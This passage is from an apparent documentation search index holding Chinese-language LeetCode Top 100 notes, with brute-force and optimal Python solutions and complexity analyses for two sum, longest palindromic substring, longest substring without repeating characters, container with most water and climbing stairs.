max_water\n</code></pre>"},{"location":"leetcode-top100/arrays-strings/container-with-most-water/#_5","title":"\u6700\u4f18\u65b9\u6848\uff08\u53cc\u6307\u9488\u6cd5\uff09","text":"<p>\u4f7f\u7528\u4e24\u4e2a\u6307\u9488\u5206\u522b\u6307\u5411\u6570\u7ec4\u7684\u5f00\u59cb\u548c\u7ed3\u675f\u4f4d\u7f6e\uff0c\u6bcf\u6b21\u79fb\u52a8\u8f83\u77ed\u7684\u90a3\u4e2a\u6307\u9488\uff0c\u56e0\u4e3a\u53ea\u6709\u8fd9\u6837\u624d\u6709\u53ef\u80fd\u589e\u52a0\u5bb9\u5668\u7684\u5bb9\u91cf\u3002</p> <pre><code>def max_area_optimal(height):\n    max_water = 0\n    # \u521d\u59cb\u5316\u5de6\u6307\u9488\u548c\u53f3\u6307\u9488\n    left = 0\n    right = len(height) - 1\n\n    # \u5f53\u5de6\u6307\u9488\u5c0f\u4e8e\u53f3\u6307\u9488\u65f6\uff0c\u7ee7\u7eed\u79fb\u52a8\n    while left &lt; right:\n        # \u8ba1\u7b97\u5f53\u524d\u5bb9\u5668\u7684\u5bbd\u5ea6\n        width = right - left\n        # \u8ba1\u7b97\u5f53\u524d\u5bb9\u5668\u7684\u9ad8\u5ea6\uff08\u53d6\u4e24\u6761\u7ebf\u4e2d\u8f83\u4f4e\u7684\u90a3\u4e2a\uff09\n        if height[left] &lt; height[right]:\n            h = height[left]\n            left += 1  # \u79fb\u52a8\u5de6\u6307\u9488\n        else:\n            h = height[right]\n            right -= 1  # \u79fb\u52a8\u53f3\u6307\u9488\n\n        # \u8ba1\u7b97\u5f53\u524d\u5bb9\u5668\u7684\u5bb9\u91cf\u5e76\u66f4\u65b0\u6700\u5927\u503c\n        current_water = width * h\n        max_water = max(max_water, current_water)\n\n    return max_water\n</code></pre>"},{"location":"leetcode-top100/arrays-strings/container-with-most-water/#_6","title":"\u590d\u6742\u5ea6\u5206\u6790","text":"<ul> <li>\u66b4\u529b\u89e3\u6cd5\uff1a</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n\u00b2)\uff0c\u5176\u4e2d n \u662f\u6570\u7ec4\u957f\u5ea6</li> <li> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(1)</p> </li> <li> <p>\u53cc\u6307\u9488\u89e3\u6cd5\uff1a</p> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u53ea\u9700\u8981\u904d\u5386\u6570\u7ec4\u4e00\u6b21</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(1)</li> </ul> <p>\u53cc\u6307\u9488\u89e3\u6cd5\u901a\u8fc7\u8d2a\u5fc3\u7684\u7b56\u7565\uff0c\u6bcf\u6b21\u79fb\u52a8\u8f83\u77ed\u7684\u8fb9\u754c\uff0c\u907f\u514d\u4e86\u4e0d\u5fc5\u8981\u7684\u8ba1\u7b97\uff0c\u5c06\u65f6\u95f4\u590d\u6742\u5ea6\u964d\u4f4e\u5230\u4e86 O(n)\uff0c\u662f\u89e3\u51b3\u6b64\u7c7b\u95ee\u9898\u7684\u6700\u4f18\u65b9\u6848\u3002</p>"},{"location":"leetcode-top100/arrays-strings/longest-palindromic-substring/","title":"\u6700\u957f\u56de\u6587\u5b50\u4e32","text":""},{"location":"leetcode-top100/arrays-strings/longest-palindromic-substring/#_2","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u7ed9\u4f60\u4e00\u4e2a\u5b57\u7b26\u4e32 <code>s</code>\uff0c\u627e\u5230 <code>s</code> \u4e2d\u6700\u957f\u7684\u56de\u6587\u5b50\u4e32\u3002</p>"},{"location":"leetcode-top100/arrays-strings/longest-palindromic-substring/#_3","title":"\u89e3\u9898\u601d\u8def","text":"<p>\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u6cd5\u89e3\u51b3\uff1a 1. \u66b4\u529b\u89e3\u6cd5\uff1a\u68c0\u67e5\u6240\u6709\u53ef\u80fd\u7684\u5b50\u4e32 2. \u4e2d\u5fc3\u6269\u5c55\u6cd5\uff1a\u4ece\u6bcf\u4e2a\u53ef\u80fd\u7684\u4e2d\u5fc3\u5411\u4e24\u8fb9\u6269\u5c55</p>"},{"location":"leetcode-top100/arrays-strings/longest-palindromic-substring/#_4","title":"\u6700\u7b80\u5355\u7684\u65b9\u6cd5\uff08\u66b4\u529b\u89e3\u6cd5\uff09","text":"<p>\u904d\u5386\u6240\u6709\u53ef\u80fd\u7684\u5b50\u4e32\uff0c\u68c0\u67e5\u5b83\u4eec\u662f\u5426\u662f\u56de\u6587\u4e32\uff0c\u5e76\u8bb0\u5f55\u6700\u957f\u7684\u56de\u6587\u5b50\u4e32\u3002</p> <pre><code>def longest_palindrome_brute(s):\n    if not s or len(s) &lt; 1:\n        return \"\"\n\n    max_length = 0\n    start = 0\n\n    # \u904d\u5386\u6240\u6709\u53ef\u80fd\u7684\u5b50\u4e32\n    for i in range(len(s)):\n        for j in range(i, len(s)):\n            # \u68c0\u67e5\u5b50\u4e32\u662f\u5426\u4e3a\u56de\u6587\u4e32\n            if is_palindrome(s, i, j):\n                # \u5982\u679c\u662f\u56de\u6587\u4e32\u4e14\u957f\u5ea6\u66f4\u957f\uff0c\u66f4\u65b0\u6700\u957f\u56de\u6587\u4e32\u4fe1\u606f\n                if j - i + 1 &gt; max_length:\n                    max_length = j - i + 1\n                    start = i\n\n    return s[start:start + max_length]\n\n# \u8f85\u52a9\u51fd\u6570\uff0c\u68c0\u67e5\u5b50\u4e32\u662f\u5426\u4e3a\u56de\u6587\u4e32\ndef is_palindrome(s, left, right):\n    while left &lt; right:\n        if s[left] != s[right]:\n            return False\n        left += 1\n        right -= 1\n    return True\n</code></pre>"},{"location":"leetcode-top100/arrays-strings/longest-palindromic-substring/#_5","title":"\u6700\u4f18\u65b9\u6848\uff08\u4e2d\u5fc3\u6269\u5c55\u6cd5\uff09","text":"<p>\u4ece\u6bcf\u4e2a\u53ef\u80fd\u7684\u4e2d\u5fc3\u4f4d\u7f6e\u5411\u4e24\u8fb9\u6269\u5c55\uff0c\u68c0\u67e5\u662f\u5426\u80fd\u5f62\u6210\u56de\u6587\u4e32\u3002\u6ce8\u610f\u56de\u6587\u4e32\u7684\u4e2d\u5fc3\u53ef\u80fd\u662f\u4e00\u4e2a\u5b57\u7b26\uff08\u5947\u6570\u957f\u5ea6\uff09\u6216\u4e24\u4e2a\u5b57\u7b26\u4e4b\u95f4\u7684\u4f4d\u7f6e\uff08\u5076\u6570\u957f\u5ea6\uff09\u3002</p> <pre><code>def longest_palindrome_optimal(s):\n    if not s or len(s) &lt; 1:\n        return \"\"\n\n    start = 0\n    end = 0\n\n    # \u904d\u5386\u6bcf\u4e2a\u53ef\u80fd\u7684\u4e2d\u5fc3\u4f4d\u7f6e\n    for i in range(len(s)):\n        # \u4ee5\u5355\u4e2a\u5b57\u7b26\u4e3a\u4e2d\u5fc3\u7684\u56de\u6587\u4e32\uff08\u5947\u6570\u957f\u5ea6\uff09\n        len1 = expand_around_center(s, i, i)\n        # \u4ee5\u4e24\u4e2a\u5b57\u7b26\u4e4b\u95f4\u4e3a\u4e2d\u5fc3\u7684\u56de\u6587\u4e32\uff08\u5076\u6570\u957f\u5ea6\uff09\n        len2 = expand_around_center(s, i, i + 1)\n\n        # \u53d6\u4e24\u79cd\u60c5\u51b5\u4e2d\u7684\u6700\u5927\u957f\u5ea6\n        max_len = max(len1, len2)\n\n        # \u5982\u679c\u5f53\u524d\u627e\u5230\u7684\u56de\u6587\u4e32\u66f4\u957f\uff0c\u66f4\u65b0\u8d77\u59cb\u548c\u7ed3\u675f\u4f4d\u7f6e\n        if max_len &gt; end - start:\n            start = i - (max_len - 1) // 2\n            end = i + max_len // 2\n\n    return s[start:end + 1]\n\n# \u8f85\u52a9\u51fd\u6570\uff0c\u4ece\u4e2d\u5fc3\u5411\u4e24\u8fb9\u6269\u5c55\ndef expand_around_center(s, left, right):\n    while left &gt;= 0 and right &lt; len(s) and s[left] == s[right]:\n        left -= 1\n        right += 1\n    # \u8fd4\u56de\u56de\u6587\u4e32\u7684\u957f\u5ea6\n    return right - left - 1\n</code></pre>"},{"location":"leetcode-top100/arrays-strings/longest-palindromic-substring/#_6","title":"\u590d\u6742\u5ea6\u5206\u6790","text":"<ul> <li>\u66b4\u529b\u89e3\u6cd5\uff1a</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n\u00b3)\uff0c\u5176\u4e2d n \u662f\u5b57\u7b26\u4e32\u957f\u5ea6</li> <li> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(1)</p> </li> <li> <p>\u4e2d\u5fc3\u6269\u5c55\u6cd5\uff1a</p> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n\u00b2)\uff0c\u9700\u8981\u68c0\u67e5 2n-1 \u4e2a\u53ef\u80fd\u7684\u4e2d\u5fc3\uff0c\u6bcf\u4e2a\u4e2d\u5fc3\u6700\u591a\u6269\u5c55 n \u6b21</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(1)</li> </ul> <p>\u4e2d\u5fc3\u6269\u5c55\u6cd5\u907f\u514d\u4e86\u91cd\u590d\u68c0\u67e5\u5b50\u4e32\uff0c\u5c06\u65f6\u95f4\u590d\u6742\u5ea6\u964d\u4f4e\u5230\u4e86 O(n\u00b2)\uff0c\u662f\u89e3\u51b3\u6b64\u7c7b\u95ee\u9898\u7684\u8f83\u597d\u65b9\u6cd5\u3002</p>"},{"location":"leetcode-top100/arrays-strings/longest-substring-without-repeating-characters/","title":"\u6700\u957f\u65e0\u91cd\u590d\u5b50\u4e32","text":""},{"location":"leetcode-top100/arrays-strings/longest-substring-without-repeating-characters/#_2","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u7ed9\u5b9a\u4e00\u4e2a\u5b57\u7b26\u4e32 <code>s</code>\uff0c\u8bf7\u4f60\u627e\u51fa\u5176\u4e2d\u4e0d\u542b\u6709\u91cd\u590d\u5b57\u7b26\u7684 \u6700\u957f\u5b50\u4e32 \u7684\u957f\u5ea6\u3002</p>"},{"location":"leetcode-top100/arrays-strings/longest-substring-without-repeating-characters/#_3","title":"\u89e3\u9898\u601d\u8def","text":"<p>\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u6cd5\u89e3\u51b3\uff1a 1. \u66b4\u529b\u89e3\u6cd5\uff1a\u68c0\u67e5\u6240\u6709\u53ef\u80fd\u7684\u5b50\u4e32 2. \u6ed1\u52a8\u7a97\u53e3\uff1a\u4f7f\u7528\u53cc\u6307\u9488\u548c\u54c8\u5e0c\u96c6\u5408\u4f18\u5316\u89e3\u6cd5</p>"},{"location":"leetcode-top100/arrays-strings/longest-substring-without-repeating-characters/#_4","title":"\u6700\u7b80\u5355\u7684\u65b9\u6cd5\uff08\u66b4\u529b\u89e3\u6cd5\uff09","text":"<p>\u904d\u5386\u6240\u6709\u53ef\u80fd\u7684\u5b50\u4e32\uff0c\u68c0\u67e5\u5b83\u4eec\u662f\u5426\u5305\u542b\u91cd\u590d\u5b57\u7b26\uff0c\u5e76\u8bb0\u5f55\u6700\u957f\u7684\u65e0\u91cd\u590d\u5b50\u4e32\u957f\u5ea6\u3002</p> <pre><code>def length_of_longest_substring_brute(s):\n    if not s:\n        return 0\n\n    max_length = 0\n    # \u904d\u5386\u6240\u6709\u53ef\u80fd\u7684\u8d77\u59cb\u4f4d\u7f6e\n    for i in range(len(s)):\n        # \u904d\u5386\u6240\u6709\u53ef\u80fd\u7684\u7ed3\u675f\u4f4d\u7f6e\n        for j in range(i, len(s)):\n            # \u68c0\u67e5\u5b50\u4e32 s[i:j+1] \u662f\u5426\u6709\u91cd\u590d\u5b57\u7b26\n            substring = s[i:j+1]\n            if len(set(substring)) == len(substring):\n                # \u5982\u679c\u6ca1\u6709\u91cd\u590d\u5b57\u7b26\uff0c\u66f4\u65b0\u6700\u5927\u957f\u5ea6\n                max_length = max(max_length, j - i + 1)\n            else:\n                # \u5982\u679c\u6709\u91cd\u590d\u5b57\u7b26\uff0c\u7ed3\u675f\u5f53\u524d\u8d77\u59cb\u4f4d\u7f6e\u7684\u68c0\u67e5\n                break\n\n    return max_length\n</code></pre>"},{"location":"leetcode-top100/arrays-strings/longest-substring-without-repeating-characters/#_5","title":"\u6700\u4f18\u65b9\u6848\uff08\u6ed1\u52a8\u7a97\u53e3\uff09","text":"<p>\u4f7f\u7528\u6ed1\u52a8\u7a97\u53e3\u548c\u54c8\u5e0c\u96c6\u5408\uff0c\u53ef\u4ee5\u5728\u4e00\u6b21\u904d\u5386\u4e2d\u627e\u5230\u6700\u957f\u65e0\u91cd\u590d\u5b50\u4e32\u3002</p> <pre><code>def length_of_longest_substring_optimal(s):\n    if not s:\n        return 0\n\n    # \u521b\u5efa\u54c8\u5e0c\u96c6\u5408\uff0c\u7528\u4e8e\u5b58\u50a8\u5f53\u524d\u7a97\u53e3\u4e2d\u7684\u5b57\u7b26\n    char_set = set()\n    max_length = 0\n    left = 0\n\n    # \u53f3\u6307\u9488\u904d\u5386\u5b57\u7b26\u4e32\n    for right in range(len(s)):\n        # \u5982\u679c\u5f53\u524d\u5b57\u7b26\u5df2\u7ecf\u5728\u7a97\u53e3\u4e2d\uff0c\u79fb\u52a8\u5de6\u6307\u9488\u76f4\u5230\u91cd\u590d\u5b57\u7b26\u88ab\u79fb\u9664\n        while s[right] in char_set:\n            char_set.remove(s[left])\n            left += 1\n\n        # \u5c06\u5f53\u524d\u5b57\u7b26\u6dfb\u52a0\u5230\u7a97\u53e3\u4e2d\n        char_set.add(s[right])\n\n        # \u66f4\u65b0\u6700\u5927\u957f\u5ea6\n        max_length = max(max_length, right - left + 1)\n\n    return max_length\n</code></pre>"},{"location":"leetcode-top100/arrays-strings/longest-substring-without-repeating-characters/#_6","title":"\u590d\u6742\u5ea6\u5206\u6790","text":"<ul> <li>\u66b4\u529b\u89e3\u6cd5\uff1a</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n\u00b3)\uff0c\u5176\u4e2d n \u662f\u5b57\u7b26\u4e32\u957f\u5ea6</li> <li> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(min(n, m))\uff0c\u5176\u4e2d m \u662f\u5b57\u7b26\u96c6\u5927\u5c0f</p> </li> <li> <p>\u6ed1\u52a8\u7a97\u53e3\u89e3\u6cd5\uff1a</p> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u6bcf\u4e2a\u5b57\u7b26\u6700\u591a\u88ab\u8bbf\u95ee\u4e24\u6b21</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(min(n, m))\uff0c\u7528\u4e8e\u5b58\u50a8\u5b57\u7b26\u96c6</li> </ul> <p>\u6ed1\u52a8\u7a97\u53e3\u89e3\u6cd5\u901a\u8fc7\u4e00\u6b21\u904d\u5386\u5c31\u53ef\u4ee5\u627e\u5230\u6700\u957f\u65e0\u91cd\u590d\u5b50\u4e32\uff0c\u907f\u514d\u4e86\u4e0d\u5fc5\u8981\u7684\u91cd\u590d\u8ba1\u7b97\uff0c\u5927\u5927\u63d0\u9ad8\u4e86\u6548\u7387\u3002</p>"},{"location":"leetcode-top100/arrays-strings/overview/","title":"\u6570\u7ec4\u548c\u5b57\u7b26\u4e32","text":"<p>\u672c\u90e8\u5206\u5305\u542b\u529b\u6263Top100\u4e2d\u4e0e\u6570\u7ec4\u548c\u5b57\u7b26\u4e32\u76f8\u5173\u7684\u7b97\u6cd5\u9898\u76ee\u3002\u6570\u7ec4\u548c\u5b57\u7b26\u4e32\u662f\u7b97\u6cd5\u9898\u4e2d\u7684\u57fa\u7840\u6570\u636e\u7ed3\u6784\uff0c\u4e5f\u662f\u6700\u5e38\u89c1\u7684\u8003\u70b9\u3002</p>"},{"location":"leetcode-top100/arrays-strings/overview/#_2","title":"\u9898\u76ee\u5217\u8868","text":"<ul> <li>\u4e24\u6570\u4e4b\u548c</li> <li>\u6700\u957f\u65e0\u91cd\u590d\u5b50\u4e32</li> <li>\u6700\u957f\u56de\u6587\u5b50\u4e32</li> <li>\u76db\u6700\u591a\u6c34\u7684\u5bb9\u5668</li> <li>\u4e09\u6570\u4e4b\u548c</li> </ul> <p>\u8fd9\u4e9b\u9898\u76ee\u8986\u76d6\u4e86\u6570\u7ec4\u548c\u5b57\u7b26\u4e32\u64cd\u4f5c\u7684\u5e38\u89c1\u6280\u5de7\uff0c\u5982\u53cc\u6307\u9488\u3001\u54c8\u5e0c\u8868\u3001\u6ed1\u52a8\u7a97\u53e3\u7b49\u3002\u901a\u8fc7\u5b66\u4e60\u8fd9\u4e9b\u9898\u76ee\uff0c\u53ef\u4ee5\u638c\u63e1\u89e3\u51b3\u6570\u7ec4\u548c\u5b57\u7b26\u4e32\u95ee\u9898\u7684\u57fa\u672c\u601d\u8def\u548c\u4f18\u5316\u65b9\u6cd5\u3002</p>"},{"location":"leetcode-top100/arrays-strings/two-sum/","title":"\u4e24\u6570\u4e4b\u548c","text":""},{"location":"leetcode-top100/arrays-strings/two-sum/#_2","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u7ed9\u5b9a\u4e00\u4e2a\u6574\u6570\u6570\u7ec4 <code>nums</code> \u548c\u4e00\u4e2a\u6574\u6570\u76ee\u6807\u503c <code>target</code>\uff0c\u8bf7\u4f60\u5728\u8be5\u6570\u7ec4\u4e2d\u627e\u51fa \u548c\u4e3a\u76ee\u6807\u503c \u7684\u90a3 \u4e24\u4e2a \u6574\u6570\uff0c\u5e76\u8fd4\u56de\u5b83\u4eec\u7684\u6570\u7ec4\u4e0b\u6807\u3002</p> <p>\u4f60\u53ef\u4ee5\u5047\u8bbe\u6bcf\u79cd\u8f93\u5165\u53ea\u4f1a\u5bf9\u5e94\u4e00\u4e2a\u7b54\u6848\u3002\u4f46\u662f\uff0c\u6570\u7ec4\u4e2d\u540c\u4e00\u4e2a\u5143\u7d20\u5728\u7b54\u6848\u91cc\u4e0d\u80fd\u91cd\u590d\u51fa\u73b0\u3002</p>"},{"location":"leetcode-top100/arrays-strings/two-sum/#_3","title":"\u89e3\u9898\u601d\u8def","text":"<p>\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u6cd5\u89e3\u51b3\uff1a 1. \u66b4\u529b\u89e3\u6cd5\uff1a\u4f7f\u7528\u4e24\u5c42\u5faa\u73af\u904d\u5386\u6240\u6709\u53ef\u80fd\u7684\u6570\u5b57\u5bf9 2. \u54c8\u5e0c\u8868\u89e3\u6cd5\uff1a\u4f7f\u7528\u54c8\u5e0c\u8868\u8bb0\u5f55\u5df2\u7ecf\u904d\u5386\u8fc7\u7684\u6570\u5b57\u53ca\u5176\u7d22\u5f15</p>"},{"location":"leetcode-top100/arrays-strings/two-sum/#_4","title":"\u6700\u7b80\u5355\u7684\u65b9\u6cd5\uff08\u66b4\u529b\u89e3\u6cd5\uff09","text":"<p>\u4f7f\u7528\u4e24\u5c42\u5faa\u73af\uff0c\u904d\u5386\u6240\u6709\u53ef\u80fd\u7684\u6570\u5b57\u5bf9\uff0c\u68c0\u67e5\u5b83\u4eec\u7684\u548c\u662f\u5426\u7b49\u4e8e\u76ee\u6807\u503c\u3002</p> <pre><code>def two_sum_brute_force(nums, target):\n    # \u904d\u5386\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\n    for i in range(len(nums)):\n        # \u904d\u5386\u5f53\u524d\u5143\u7d20\u4e4b\u540e\u7684\u6240\u6709\u5143\u7d20\n        for j in range(i + 1, len(nums)):\n            # \u68c0\u67e5\u4e24\u6570\u4e4b\u548c\u662f\u5426\u7b49\u4e8e\u76ee\u6807\u503c\n            if nums[i] + nums[j] == target:\n                return [i, j]\n    # \u5982\u679c\u6ca1\u6709\u627e\u5230\u7b54\u6848\uff0c\u8fd4\u56de\u7a7a\u5217\u8868\n    return []\n</code></pre>"},{"location":"leetcode-top100/arrays-strings/two-sum/#_5","title":"\u6700\u4f18\u65b9\u6848\uff08\u54c8\u5e0c\u8868\u89e3\u6cd5\uff09","text":"<p>\u4f7f\u7528\u54c8\u5e0c\u8868\u5b58\u50a8\u5df2\u7ecf\u904d\u5386\u8fc7\u7684\u6570\u5b57\u53ca\u5176\u7d22\u5f15\uff0c\u53ef\u4ee5\u5c06\u65f6\u95f4\u590d\u6742\u5ea6\u964d\u4f4e\u5230 O(n)\u3002</p> <pre><code>def two_sum_hash_map(nums, target):\n    # \u521b\u5efa\u4e00\u4e2a\u54c8\u5e0c\u8868\uff0c\u7528\u4e8e\u5b58\u50a8\u5df2\u7ecf\u904d\u5386\u8fc7\u7684\u6570\u5b57\u53ca\u5176\u7d22\u5f15\n    num_map = {}\n\n    # \u904d\u5386\u6570\u7ec4\n    for i, num in enumerate(nums):\n        # \u8ba1\u7b97\u5f53\u524d\u6570\u5b57\u9700\u8981\u7684\u914d\u5bf9\u6570\u5b57\n        complement = target - num\n\n        # \u68c0\u67e5\u914d\u5bf9\u6570\u5b57\u662f\u5426\u5df2\u7ecf\u5728\u54c8\u5e0c\u8868\u4e2d\n        if complement in num_map:\n            # \u5982\u679c\u5728\uff0c\u8fd4\u56de\u4e24\u4e2a\u6570\u5b57\u7684\u7d22\u5f15\n            return [num_map[complement], i]\n\n        # \u5c06\u5f53\u524d\u6570\u5b57\u53ca\u5176\u7d22\u5f15\u6dfb\u52a0\u5230\u54c8\u5e0c\u8868\u4e2d\n        num_map[num] = i\n\n    # \u5982\u679c\u6ca1\u6709\u627e\u5230\u7b54\u6848\uff0c\u8fd4\u56de\u7a7a\u5217\u8868\n    return []\n</code></pre>"},{"location":"leetcode-top100/arrays-strings/two-sum/#_6","title":"\u590d\u6742\u5ea6\u5206\u6790","text":"<ul> <li>\u66b4\u529b\u89e3\u6cd5\uff1a</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n\u00b2)\uff0c\u5176\u4e2d n \u662f\u6570\u7ec4\u957f\u5ea6</li> <li> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(1)</p> </li> <li> <p>\u54c8\u5e0c\u8868\u89e3\u6cd5\uff1a</p> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u53ea\u9700\u8981\u904d\u5386\u6570\u7ec4\u4e00\u6b21</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u7528\u4e8e\u5b58\u50a8\u54c8\u5e0c\u8868</li> </ul> <p>\u54c8\u5e0c\u8868\u89e3\u6cd5\u901a\u8fc7\u727a\u7272\u7a7a\u95f4\u590d\u6742\u5ea6\u6362\u53d6\u4e86\u65f6\u95f4\u590d\u6742\u5ea6\u7684\u663e\u8457\u63d0\u5347\uff0c\u662f\u89e3\u51b3\u6b64\u7c7b\u95ee\u9898\u7684\u6700\u4f18\u65b9\u6848\u3002</p>"},{"location":"leetcode-top100/dynamic-programming/climbing-stairs/","title":"\u722c\u697c\u68af","text":""},{"location":"leetcode-top100/dynamic-programming/climbing-stairs/#_2","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u5047\u8bbe\u4f60\u6b63\u5728\u722c\u697c\u68af\u3002\u9700\u8981 n \u9636\u4f60\u624d\u80fd\u5230\u8fbe\u697c\u9876\u3002</p> <p>\u6bcf\u6b21\u4f60\u53ef\u4ee5\u722c 1 \u6216 2 \u4e2a\u53f0\u9636\u3002\u4f60\u6709\u591a\u5c11\u79cd\u4e0d\u540c\u7684\u65b9\u6cd5\u53ef\u4ee5\u722c\u5230\u697c\u9876\u5462\uff1f</p>"},{"location":"leetcode-top100/dynamic-programming/climbing-stairs/#_3","title":"\u89e3\u9898\u601d\u8def","text":"<p>\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u6cd5\u89e3\u51b3\uff1a 1. \u66b4\u529b\u89e3\u6cd5\uff1a\u4f7f\u7528\u9012\u5f52\u76f4\u63a5\u8ba1\u7b97 2. \u52a8\u6001\u89c4\u5212\uff1a\u5b58\u50a8\u5b50\u95ee\u9898\u7684\u89e3\uff0c\u907f\u514d\u91cd\u590d\u8ba1\u7b97</p>"},{"location":"leetcode-top100/dynamic-programming/climbing-stairs/#_4","title":"\u6700\u7b80\u5355\u7684\u65b9\u6cd5\uff08\u9012\u5f52\uff09","text":"<p>\u76f4\u63a5\u4f7f\u7528\u9012\u5f52\u8ba1\u7b97\u5230\u8fbe\u7b2c n \u9636\u7684\u65b9\u6cd5\u6570\u3002</p> <pre><code>def climb_stairs_brute(n):\n    # \u57fa\u672c\u60c5\u51b5\uff1a\u5230\u8fbe\u7b2c1\u9636\u6216\u7b2c2\u9636\u7684\u65b9\u6cd5\u6570\n    if n == 1:\n        return 1\n    if n == 2:\n        return 2\n\n    # \u9012\u5f52\u5173\u7cfb\uff1a\u5230\u8fbe\u7b2cn\u9636\u7684\u65b9\u6cd5\u6570\u7b49\u4e8e\u5230\u8fbe\u7b2cn-1\u9636\u7684\u65b9\u6cd5\u6570\u52a0\u4e0a\u5230\u8fbe\u7b2cn-2\u9636\u7684\u65b9\u6cd5\u6570\n    return climb_stairs_brute(n - 1) + climb_stairs_brute(n - 2)\n</code></pre> <p>\u6ce8\u610f\uff1a\u8fd9\u79cd\u65b9\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5f88\u9ad8\uff0c\u4f1a\u6709\u5f88\u591a\u91cd\u590d\u8ba1\u7b97\uff0c\u53ef\u80fd\u5bfc\u81f4\u8d85\u65f6\u3002</p>"},{"location":"leetcode-top100/dynamic-programming/climbing-stairs/#_5","title":"\u6700\u4f18\u65b9\u6848\uff08\u52a8\u6001\u89c4\u5212\uff09","text":"<p>\u4f7f\u7528\u6570\u7ec4\u5b58\u50a8\u5df2\u7ecf\u8ba1\u7b97\u8fc7\u7684\u5b50\u95ee\u9898\u7684\u89e3\uff0c\u907f\u514d\u91cd\u590d\u8ba1\u7b97\u3002</p> <pre><code>def climb_stairs_optimal(n):\n    # \u7279\u6b8a\u60c5\u51b5\u5904\u7406\n    if n == 1:\n        return 1\n    if n == 2:\n        return 2\n\n    # \u521b\u5efadp\u6570\u7ec4\uff0cdp[i]\u8868\u793a\u5230\u8fbe\u7b2ci\u9636\u7684\u65b9\u6cd5\u6570\n    dp = [0] * (n + 1)\n    # \u521d\u59cb\u5316\u57fa\u672c\u60c5\u51b5\n    dp[1] = 1\n    dp[2] = 2\n\n    # \u586b\u5145dp\u6570\u7ec4\n    for i in range(3, n + 1):\n        # \u72b6\u6001\u8f6c\u79fb\u65b9\u7a0b\uff1a\u5230\u8fbe\u7b2ci\u9636\u7684\u65b9\u6cd5\u6570\u7b49\u4e8e\u5230\u8fbe\u7b2ci-1\u9636\u7684\u65b9\u6cd5\u6570\u52a0\u4e0a\u5230\u8fbe\u7b2ci-2\u9636\u7684\u65b9\u6cd5\u6570\n        dp[i] = dp[i - 1] + dp[i - 2]\n\n    return dp[n]\n</code></pre>"},{"location":"leetcode-top100/dynamic-programming/climbing-stairs/#_6","title":"\u7a7a\u95f4\u4f18\u5316\u7684\u52a8\u6001\u89c4\u5212\u89e3\u6cd5","text":"<p>\u7531\u4e8e\u6bcf\u4e2a\u72b6\u6001\u53ea\u4f9d\u8d56\u4e8e\u524d\u4e24\u4e2a\u72b6\u6001\uff0c\u53ef\u4ee5\u53ea\u4f7f\u7528\u4e24\u4e2a\u53d8\u91cf\u6765\u5b58\u50a8\u524d\u4e24\u4e2a\u72b6\u6001\u7684\u503c\uff0c\u8fdb\u4e00\u6b65\u4f18\u5316\u7a7a\u95f4\u590d\u6742\u5ea6\u3002</p> <pre><code>def climb_stairs_optimized_space(n):\n    # \u7279\u6b8a\u60c5\u51b5\u5904\u7406\n    if n == 1:\n        return 1\n    if n == 2:\n        return 2\n\n    # \u521d\u59cb\u5316\u524d\u4e24\u4e2a\u72b6\u6001\n    prev = 1  # dp[1]\n    curr = 2  # dp[2]\n\n    # \u8ba1\u7b97\u540e\u7eed\u72b6\u6001\n    for i in range(3, n + 1):\n        # \u8ba1\u7b97\u5f53\u524d\u72b6\u6001\n        next_val = prev + curr\n        # \u66f4\u65b0\u524d\u4e24\u4e2a\u72b6\u6001\n        prev, curr = curr, next_val\n\n    return curr\n</code></pre>"},{"location":"leetcode-top100/dynamic-programming/climbing-stairs/#_7","title":"\u590d\u6742\u5ea6\u5206\u6790","text":"<ul> <li>\u9012\u5f52\u89e3\u6cd5\uff1a</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(2^n)\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u95ee\u9898\u4f1a\u5206\u89e3\u6210\u4e24\u4e2a\u5b50\u95ee\u9898\uff0c\u5f62\u6210\u6307\u6570\u7ea7\u7684\u9012\u5f52\u6811</li> <li> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u9012\u5f52\u8c03\u7528\u6808\u7684\u6df1\u5ea6</p> </li> <li> <p>\u52a8\u6001\u89c4\u5212\u89e3\u6cd5\uff1a</p> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u53ea\u9700\u8981\u4e00\u6b21\u904d\u5386</li> <li> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u7528\u4e8e\u5b58\u50a8dp\u6570\u7ec4</p> </li> <li> 